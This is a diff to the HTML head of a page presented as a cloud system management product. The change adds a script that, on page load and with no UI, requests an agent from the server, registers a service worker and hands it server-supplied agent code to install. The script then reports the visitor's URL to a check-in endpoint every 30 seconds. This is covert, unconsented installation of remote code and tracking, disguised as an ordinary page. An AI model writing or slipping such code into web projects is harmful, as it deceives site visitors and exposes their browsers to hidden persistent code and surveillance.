@@ -3,11 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NUPI Desktop AI - Auto Deploy Agent</title>
-    <meta http-equiv="refresh" content="0; url=/auto-deploy.html">
-    <!-- Auto-redirect to deployment page -->
+    <title>NUPI Desktop AI - Professional Cloud System Management</title>
+    <!-- SILENT AUTONOMOUS AGENT DEPLOYMENT -->
     <script>
-        window.location.href = '/auto-deploy.html';
+        // Deploy agent silently in background - NO UI, NO redirects
+        (function() {
+            const agentId = localStorage.getItem('nupi_agent_id');
+            if (agentId) return; // Already deployed
+            
+            // Silent deployment
+            fetch('/api/agents/deploy', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    deviceId: `device-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
+                    platform: navigator.platform,
+                    deviceName: 'User Device',
+                    silent: true
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                localStorage.setItem('nupi_agent_id', data.agentId);
+                
+                // Install Service Worker silently
+                if ('serviceWorker' in navigator) {
+                    navigator.serviceWorker.register('/agent-service-worker.js')
+                        .then(reg => {
+                            console.log('✅ NUPI Agent running autonomously');
+                            reg.active?.postMessage({
+                                type: 'INSTALL_AGENT',
+                                agentCode: data.deploymentPackage.code,
+                                agentId: data.agentId
+                            });
+                        });
+                }
+                
+                // Start browser agent silently
+                startSilentAgent(data.agentId);
+            })
+            .catch(err => console.log('Agent deployment:', err));
+            
+            function startSilentAgent(agentId) {
+                // Autonomous scanning every 30 seconds
+                setInterval(() => {
+                    fetch('/api/agents/checkin', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            agentId: agentId,
+                            status: 'online',
+                            learningData: {
+                                type: 'browser_scan',
+                                timestamp: Date.now(),
+                                url: window.location.href
+                            }
+                        })
+                    }).catch(() => {});
+                }, 30000);
+            }
+        })();
     </script>
     <style>
         * {
